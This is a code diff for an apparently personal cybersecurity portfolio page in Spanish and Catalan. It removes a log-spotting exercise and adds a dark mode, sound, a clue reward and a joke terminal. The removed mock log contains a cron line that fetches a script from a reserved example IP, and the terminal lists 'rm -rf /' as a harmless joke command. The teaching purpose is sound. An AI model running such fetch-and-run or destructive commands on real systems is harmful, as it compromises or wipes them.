@@ -1,4 +1,4 @@
-/* Portfolio: huella dibujada, pruebas que se mueven, filtro, SHA-256 real, casos, glosario y luz UV */
+/* Portfolio: huella dibujada, pruebas que se mueven, filtro, SHA-256 real, glosario y luz UV */
 document.documentElement.classList.add("js");
 
 const reducido = matchMedia("(prefers-reduced-motion: reduce)").matches;
@@ -8,16 +8,10 @@ const ca = document.documentElement.lang === "ca";
 /* ---------- Textos que dependen del idioma ---------- */
 const TXT = ca ? {
   distintos: (n) => `${n} de 64 caràcters són diferents dels de l'empremta original.`,
-  intacta: "Coincideix amb l'empremta original: la prova està intacta.",
-  marcadas: (n) => `${n} ${n === 1 ? "marcada" : "marcades"}`,
-  perfecto: (n) => `Cas resolt: has trobat les ${n} marques correctes, sense falses alarmes.`,
-  parcial: (a, n, f) => `Has trobat ${a} de ${n} i ${f === 1 ? "1 falsa alarma" : `${f} falses alarmes`}. Les línies amb vora discontínua són les que canviarien la teva resposta.`
+  intacta: "Coincideix amb l'empremta original: la prova està intacta."
 } : {
   distintos: (n) => `${n} de 64 caracteres son distintos a los de la huella original.`,
-  intacta: "Coincide con la huella original: la prueba está intacta.",
-  marcadas: (n) => `${n} ${n === 1 ? "marcada" : "marcadas"}`,
-  perfecto: (n) => `Caso resuelto: encontraste las ${n} marcas correctas, sin falsas alarmas.`,
-  parcial: (a, n, f) => `Has encontrado ${a} de ${n} y ${f === 1 ? "1 falsa alarma" : `${f} falsas alarmas`}. Las líneas con borde discontinuo son las que cambiarían tu respuesta.`
+  intacta: "Coincide con la huella original: la prueba está intacta."
 };
 
 const GLOSARIO = ca ? {
@@ -36,32 +30,6 @@ const GLOSARIO = ca ? {
   fp: "Alerta que salta sin que haya un problema real.",
   th: "Buscar amenazas de forma activa, sin esperar a que salte una alerta.",
   sha: "Función que convierte cualquier dato en una huella de 64 caracteres. Si el dato cambia, la huella también."
-};
-
-/* Casos simulados. Las IP 203.0.113.x y el dominio .example están reservados para ejemplos. */
-const CASOS = {
-  accesos: [
-    { t: "08:58:12  sshd  Accepted password for ana from 192.168.1.20", ok: false, es: "Normal: acceso desde la red interna.", ca: "Normal: accés des de la xarxa interna." },
-    { t: "09:14:02  sshd  Failed password for root from 203.0.113.45", ok: true, es: "Prueba contraseñas desde una IP externa.", ca: "Prova contrasenyes des d'una IP externa." },
-    { t: "09:14:04  sshd  Failed password for admin from 203.0.113.45", ok: true, es: "Misma IP, dos segundos después: no parece una persona.", ca: "Mateixa IP, dos segons després: no sembla una persona." },
-    { t: "09:14:06  sshd  Failed password for admin from 203.0.113.45", ok: true, es: "Sigue el ataque de fuerza bruta.", ca: "Continua l'atac de força bruta." },
-    { t: "09:14:31  sshd  Accepted password for admin from 203.0.113.45", ok: true, es: "La clave: la misma IP consigue entrar.", ca: "La clau: la mateixa IP aconsegueix entrar." },
-    { t: "09:15:10  sudo  admin : COMMAND=/usr/sbin/useradd soporte2", ok: true, es: "Crea un usuario para conservar el acceso.", ca: "Crea un usuari per conservar l'accés." },
-    { t: "09:16:48  crontab  admin : tarea, curl http://203.0.113.45/s.sh", ok: true, es: "Programa una descarga desde la IP atacante.", ca: "Programa una baixada des de la IP atacant." },
-    { t: "09:20:00  CRON  root : /usr/local/bin/copia-seguridad.sh", ok: false, es: "Normal: copia de seguridad programada.", ca: "Normal: còpia de seguretat programada." },
-    { t: "09:31:22  sshd  Failed password for ana from 192.168.1.20", ok: false, es: "Un solo fallo desde la red interna.", ca: "Una sola fallada des de la xarxa interna." },
-    { t: "09:31:29  sshd  Accepted password for ana from 192.168.1.20", ok: false, es: "Normal: ana entra a la segunda.", ca: "Normal: ana entra a la segona." }
-  ],
-  correo: [
-    { t: { es: "De: Soporte Banco <avisos@banco-seguro-verif.example>", ca: "De: Suport Banc <avisos@banco-seguro-verif.example>" }, ok: true, es: "El dominio no es el de un banco, solo lo parece.", ca: "El domini no és el d'un banc, només ho sembla." },
-    { t: { es: "Para: cliente@correo.example", ca: "Per a: client@correo.example" }, ok: false, es: "Normal: un destinatario sin nada raro.", ca: "Normal: un destinatari sense res estrany." },
-    { t: { es: "Fecha: martes, 10:12", ca: "Data: dimarts, 10:12" }, ok: false, es: "Normal: la hora no demuestra nada.", ca: "Normal: l'hora no demostra res." },
-    { t: { es: "Autenticación: spf=fail, dkim=none, dmarc=fail", ca: "Autenticació: spf=fail, dkim=none, dmarc=fail" }, ok: true, es: "Las comprobaciones de autenticidad no pasan.", ca: "Les comprovacions d'autenticitat no passen." },
-    { t: { es: "Asunto: URGENTE: su cuenta se bloqueará en 24 horas", ca: "Assumpte: URGENT: el seu compte es bloquejarà en 24 hores" }, ok: true, es: "Meter prisa evita que te pares a pensar.", ca: "Fer pressa evita que t'aturis a pensar." },
-    { t: { es: "Estimado cliente:", ca: "Benvolgut client:" }, ok: true, es: "Saludo genérico: no usa tu nombre.", ca: "Salutació genèrica: no fa servir el teu nom." },
-    { t: { es: "Enlace: Verificar mi cuenta → http://banco-seguro-verif.example/login", ca: "Enllaç: Verificar el meu compte → http://banco-seguro-verif.example/login" }, ok: true, es: "Lleva a una web falsa para robar la contraseña.", ca: "Porta a una web falsa per robar la contrasenya." },
-    { t: { es: "Atentamente, Atención al Cliente", ca: "Atentament, Atenció al Client" }, ok: false, es: "Normal: una despedida no delata nada.", ca: "Normal: un comiat no delata res." }
-  ]
 };
 
 /* ---------- Huella dactilar: crestas que se dibujan al cargar ---------- */
@@ -164,70 +132,6 @@ entradaHash.addEventListener("input", sellar);
 document.getElementById("restaurar").addEventListener("click", () => { entradaHash.value = textoOriginal; sellar(); });
 sellar();
 
-/* ---------- Casos simulados: marcar lo sospechoso y cerrar ---------- */
-document.querySelectorAll(".caso-lab").forEach((raiz) => {
-  const lineas = CASOS[raiz.dataset.caso];
-  const lista = raiz.querySelector(".registro");
-  const cerrar = raiz.querySelector(".lab__cerrar");
-  const reabrir = raiz.querySelector(".lab__reabrir");
-  const cuenta = raiz.querySelector(".lab__cuenta");
-  const veredicto = raiz.querySelector(".veredicto");
-  const nota = raiz.querySelector(".veredicto__nota");
-
-  const botones = lineas.map((linea) => {
-    const li = document.createElement("li");
-    const b = document.createElement("button");
-    b.type = "button";
-    b.textContent = typeof linea.t === "string" ? linea.t : linea.t[ca ? "ca" : "es"];
-    b.setAttribute("aria-pressed", "false");
-    b.addEventListener("click", () => {
-      b.setAttribute("aria-pressed", String(b.getAttribute("aria-pressed") !== "true"));
-      cuenta.textContent = TXT.marcadas(botones.filter((o) => o.getAttribute("aria-pressed") === "true").length);
-    });
-    const explica = document.createElement("p");
-    explica.className = "registro__nota";
-    explica.hidden = true;
-    explica.textContent = linea[ca ? "ca" : "es"];
-    li.append(b, explica);
-    lista.appendChild(li);
-    return b;
-  });
-
-  cerrar.addEventListener("click", () => {
-    let aciertos = 0, falsos = 0;
-    const reales = lineas.filter((l) => l.ok).length;
-    botones.forEach((b, i) => {
-      const marcada = b.getAttribute("aria-pressed") === "true";
-      if (marcada && lineas[i].ok) aciertos++;
-      if (marcada && !lineas[i].ok) falsos++;
-      b.disabled = true;
-      b.parentElement.classList.add(lineas[i].ok ? "es-ataque" : "es-normal");
-      if (marcada !== lineas[i].ok) b.parentElement.classList.add("fallo");
-      b.nextElementSibling.hidden = false;
-    });
-    nota.textContent = aciertos === reales && falsos === 0 ? TXT.perfecto(reales) : TXT.parcial(aciertos, reales, falsos);
-    veredicto.hidden = false;
-    cerrar.hidden = true;
-    reabrir.hidden = false;
-    veredicto.focus({ preventScroll: true });
-    veredicto.scrollIntoView({ block: "nearest", behavior: reducido ? "auto" : "smooth" });
-  });
-
-  reabrir.addEventListener("click", () => {
-    botones.forEach((b) => {
-      b.disabled = false;
-      b.setAttribute("aria-pressed", "false");
-      b.parentElement.className = "";
-      b.nextElementSibling.hidden = true;
-    });
-    cuenta.textContent = TXT.marcadas(0);
-    veredicto.hidden = true;
-    reabrir.hidden = true;
-    cerrar.hidden = false;
-    cerrar.focus();
-  });
-});
-
 /* ---------- Glosario: definición al pasar, enfocar o tocar ---------- */
 const definicion = document.getElementById("definicion");
 let terminoActivo = null;
@@ -275,7 +179,10 @@ function pintarLuz() {
     const dy = Math.max(r.top - luzY, 0, luzY - r.bottom);
     const luz = Math.max(0, Math.min(1, (170 - Math.hypot(dx, dy)) / 90));
     p.style.opacity = luz;
-    if (luz > 0.8) halladas.add(p);
+    if (luz > 0.8 && !halladas.has(p)) {
+      halladas.add(p);
+      document.dispatchEvent(new CustomEvent("portfolio:pista"));
+    }
   });
   cuentaUV.textContent = ` ${halladas.size}/${pistas.length}`;
 }
@@ -299,6 +206,230 @@ addEventListener("keydown", (e) => {
 });
 
 document.getElementById("imprimir").addEventListener("click", () => print());
+
+/* ---------- Almacenamiento opcional: la página funciona igual sin él ---------- */
+const guardado = {
+  leer(almacen, clave) { try { return window[almacen].getItem(clave); } catch { return null; } },
+  poner(almacen, clave, valor) { try { window[almacen].setItem(clave, valor); } catch { /* sin almacenamiento */ } }
+};
+
+/* ---------- Intro: la carpeta se abre una vez por sesión y no bloquea nada ---------- */
+if (!reducido && !guardado.leer("sessionStorage", "carpeta")) {
+  guardado.poner("sessionStorage", "carpeta", "1");
+  const carpeta = document.createElement("div");
+  carpeta.className = "carpeta maq";
+  carpeta.setAttribute("aria-hidden", "true");
+  const izquierda = document.createElement("span");
+  izquierda.textContent = "Expediente ALC";
+  carpeta.append(izquierda, document.createElement("span"));
+  document.body.appendChild(carpeta);
+  setTimeout(() => carpeta.remove(), 1300);
+}
+
+/* ---------- Huella: las crestas se apartan del ratón ---------- */
+if (!reducido && matchMedia("(hover: hover) and (pointer: fine)").matches) {
+  const crestas = [...huella.querySelectorAll("path")].map((el) => ({
+    el,
+    puntos: el.getAttribute("d").slice(2).split(" L ").map((p) => p.split(" ").map(Number))
+  }));
+  const portada = document.querySelector(".portada");
+  let cx = 0, cy = 0, fuerza = 0, objetivo = 0, activo = false, preparada = false;
+  function deformar(ms) {
+    fuerza += (objetivo - fuerza) * 0.12;
+    const temblor = 1 + 0.08 * Math.sin(ms / 70);
+    crestas.forEach(({ el, puntos }) => {
+      el.setAttribute("d", "M " + puntos.map(([x, y]) => {
+        const dx = x - cx, dy = y - cy, dist = Math.hypot(dx, dy) || 1;
+        const empuje = dist < 95 ? ((1 - dist / 95) ** 2) * 26 * fuerza * temblor : 0;
+        return `${(x + (dx / dist) * empuje).toFixed(1)} ${(y + (dy / dist) * empuje).toFixed(1)}`;
+      }).join(" L "));
+    });
+    if (objetivo || fuerza > 0.01) requestAnimationFrame(deformar);
+    else activo = false;
+  }
+  portada.addEventListener("pointermove", (e) => {
+    if (!preparada) { // la línea discontinua de la animación inicial ya no hace falta
+      crestas.forEach(({ el }) => { el.getAnimations().forEach((a) => a.finish()); el.style.removeProperty("stroke-dasharray"); });
+      preparada = true;
+    }
+    const c = new DOMPoint(e.clientX, e.clientY).matrixTransform(huella.getScreenCTM().inverse());
+    cx = c.x; cy = c.y; objetivo = 1;
+    if (!activo) { activo = true; requestAnimationFrame(deformar); }
+  }, { passive: true });
+  portada.addEventListener("pointerleave", () => { objetivo = 0; });
+}
+
+/* ---------- Botones nuevos de la cinta ---------- */
+function botonCinta(texto, etiqueta, pulsado) {
+  const b = document.createElement("button");
+  b.type = "button";
+  b.className = "uv-boton";
+  b.textContent = texto;
+  b.setAttribute("aria-label", etiqueta);
+  if (pulsado !== undefined) b.setAttribute("aria-pressed", String(pulsado));
+  botonUV.before(b);
+  return b;
+}
+
+/* ---------- Modo oscuro: sala de pruebas ---------- */
+const raizHtml = document.documentElement;
+const botonTema = botonCinta("◐", ca ? "Mode fosc" : "Modo oscuro", false);
+function ponerTema(oscuro) {
+  raizHtml.classList.toggle("oscuro", oscuro);
+  botonTema.setAttribute("aria-pressed", String(oscuro));
+  guardado.poner("localStorage", "tema", oscuro ? "oscuro" : "claro");
+}
+if (guardado.leer("localStorage", "tema") === "oscuro") ponerTema(true);
+botonTema.addEventListener("click", () => ponerTema(!raizHtml.classList.contains("oscuro")));
+// El papel impreso siempre sale claro
+let temaAlImprimir = false;
+addEventListener("beforeprint", () => { temaAlImprimir = raizHtml.classList.contains("oscuro"); raizHtml.classList.remove("oscuro"); });
+addEventListener("afterprint", () => raizHtml.classList.toggle("oscuro", temaAlImprimir));
+
+/* ---------- Sonido: apagado por defecto y generado en el navegador ---------- */
+const botonSonido = botonCinta("♪", ca ? "So" : "Sonido", false);
+let audio = null;
+function sonar(tipo) {
+  if (!audio) return;
+  const osc = audio.createOscillator();
+  const vol = audio.createGain();
+  const ahora = audio.currentTime;
+  const sello = tipo === "sello";
+  osc.type = sello ? "sine" : "square";
+  osc.frequency.setValueAtTime(sello ? 130 : 1500 + Math.random() * 500, ahora);
+  if (sello) osc.frequency.exponentialRampToValueAtTime(45, ahora + 0.16);
+  vol.gain.setValueAtTime(sello ? 0.4 : 0.035, ahora);
+  vol.gain.exponentialRampToValueAtTime(0.001, ahora + (sello ? 0.2 : 0.03));
+  osc.connect(vol).connect(audio.destination);
+  osc.start(ahora);
+  osc.stop(ahora + 0.22);
+}
+botonSonido.addEventListener("click", () => {
+  const activar = !audio;
+  if (activar) { audio = new AudioContext(); sonar("sello"); }
+  else { audio.close(); audio = null; }
+  botonSonido.setAttribute("aria-pressed", String(activar));
+});
+
+/* ---------- Rango: encontrar todas las pistas tiene premio ---------- */
+const cierre = document.createElement("dialog");
+cierre.className = "cierre";
+const cierreSello = document.createElement("p");
+cierreSello.className = "cierre__sello maq";
+cierreSello.textContent = ca ? "Cas tancat" : "Caso cerrado";
+const cierreTexto = document.createElement("p");
+cierreTexto.textContent = ca
+  ? "Has trobat totes les pistes amb la llum ultraviolada. Rang: investigadora. Parlem?"
+  : "Has encontrado todas las pistas con la luz ultravioleta. Rango: investigadora. ¿Hablamos?";
+const cierreCorreo = document.createElement("a");
+cierreCorreo.className = "boton maq";
+cierreCorreo.href = "mailto:antoniacracana@gmail.com";
+cierreCorreo.textContent = ca ? "Escriu-me" : "Escríbeme";
+const cierreBoton = document.createElement("button");
+cierreBoton.type = "button";
+cierreBoton.className = "boton boton--suave maq";
+cierreBoton.textContent = ca ? "Tanca" : "Cerrar";
+cierreBoton.addEventListener("click", () => cierre.close());
+cierre.append(cierreSello, cierreTexto, cierreCorreo, cierreBoton);
+document.body.appendChild(cierre);
+let rangoMostrado = false;
+function comprobarRango() {
+  if (rangoMostrado || halladas.size < pistas.length) return;
+  rangoMostrado = true;
+  ponerUV(false);
+  cierre.showModal();
+  sonar("sello");
+}
+document.addEventListener("portfolio:pista", comprobarRango);
+
+/* ---------- Terminal secreta: tecla ñ o botón de la cinta ---------- */
+const textoDe = (sel) => [...document.querySelectorAll(sel)].map((n) => n.textContent.trim());
+const AYUDA = ca
+  ? "Ordres: whoami, ls pruebas, ls casos, cat cv, contacto, estado, uv, tema, clear, exit"
+  : "Comandos: whoami, ls pruebas, ls casos, cat cv, contacto, estado, uv, tema, clear, exit";
+const COMANDOS = {
+  ayuda: () => AYUDA,
+  help: () => AYUDA,
+  whoami: () => document.querySelector(".portada__texto").textContent.trim(),
+  "ls pruebas": () => textoDe(".prueba h3").join("\n"),
+  "ls casos": () => textoDe(".caso strong").join("\n"),
+  "cat cv": () => textoDe(".cadena li").map((t) => t.replace(/\s+/g, " ")).join("\n\n"),
+  contacto: () => "antoniacracana@gmail.com\nhttps://github.com/Lorena639",
+  estado: () => `${ca ? "Pistes UV" : "Pistas UV"}: ${halladas.size}/${pistas.length}`,
+  uv: () => { terminal.close(); ponerUV(!document.body.classList.contains("uv")); return ""; },
+  tema: () => { ponerTema(!raizHtml.classList.contains("oscuro")); return "OK"; },
+  sudo: () => (ca ? "Aquest incident serà reportat." : "Este incidente será reportado."),
+  "rm -rf /": () => (ca ? "Bon intent. La cadena de custòdia ho ha registrat." : "Buen intento. La cadena de custodia lo ha registrado.")
+};
+const terminal = document.createElement("dialog");
+terminal.className = "terminal maq";
+terminal.setAttribute("aria-label", ca ? "Terminal" : "Terminal");
+const salida = document.createElement("div");
+salida.className = "terminal__salida";
+salida.setAttribute("aria-live", "polite");
+const formLinea = document.createElement("div");
+formLinea.className = "terminal__linea";
+const prompt = document.createElement("span");
+prompt.textContent = "alc@expediente:~$";
+const entrada = document.createElement("input");
+entrada.setAttribute("aria-label", ca ? "Ordre" : "Comando");
+entrada.autocomplete = "off";
+entrada.spellcheck = false;
+entrada.autocapitalize = "off";
+formLinea.append(prompt, entrada);
+terminal.append(salida, formLinea);
+document.body.appendChild(terminal);
+function escribir(texto, clase) {
+  const p = document.createElement("p");
+  p.textContent = texto;
+  if (clase) p.className = clase;
+  salida.appendChild(p);
+  salida.scrollTop = salida.scrollHeight;
+}
+entrada.addEventListener("keydown", (e) => {
+  if (e.key !== "Enter") { if (e.key.length === 1) sonar("tecla"); return; }
+  e.preventDefault(); // si no, este Enter pulsa el botón de la cinta al cerrarse la terminal
+  const orden = entrada.value.trim().toLowerCase();
+  entrada.value = "";
+  if (!orden) return;
+  escribir(`$ ${orden}`, "terminal__eco");
+  if (orden === "exit") { terminal.close(); return; }
+  if (orden === "clear") { salida.replaceChildren(); return; }
+  const accion = COMANDOS[orden] || (orden.startsWith("sudo ") ? COMANDOS.sudo : null);
+  const resultado = accion ? accion() : (ca ? `Ordre desconeguda: ${orden}. Prova «help».` : `Comando desconocido: ${orden}. Prueba «help».`);
+  if (resultado) escribir(resultado);
+});
+function abrirTerminal() {
+  if (terminal.open) return;
+  if (!salida.childElementCount) escribir(AYUDA);
+  terminal.showModal();
+  entrada.focus();
+}
+botonCinta(">_", ca ? "Obre la terminal" : "Abrir la terminal").addEventListener("click", abrirTerminal);
+addEventListener("keydown", (e) => {
+  if (e.key.toLowerCase() !== "ñ" || e.ctrlKey || e.metaKey || e.altKey) return;
+  if (e.target.closest("input, textarea, dialog")) return;
+  e.preventDefault();
+  abrirTerminal();
+});
+
+/* ---------- Títulos a máquina y tarjetas que caen sobre la mesa ---------- */
+if (!reducido && "IntersectionObserver" in window) {
+  const vigiaEntrada = new IntersectionObserver((entradas) => {
+    entradas.forEach((e) => {
+      if (!e.isIntersecting) return;
+      // Un título recortado no cuenta como visible: se vigila su contenedor
+      (e.target.querySelector(":scope > h2.escribe") || e.target).classList.add("entrado");
+      vigiaEntrada.unobserve(e.target);
+    });
+  }, { threshold: 0.1 });
+  document.querySelectorAll("main h2").forEach((h) => { h.classList.add("escribe"); vigiaEntrada.observe(h.parentElement); });
+  pruebas.forEach((p, i) => {
+    p.classList.add("cae");
+    p.style.setProperty("--retardo", `${i * 70}ms`);
+    vigiaEntrada.observe(p);
+  });
+}
 
 /* ---------- Aparición al entrar en pantalla ---------- */
 const aparecen = document.querySelectorAll(".aparece");
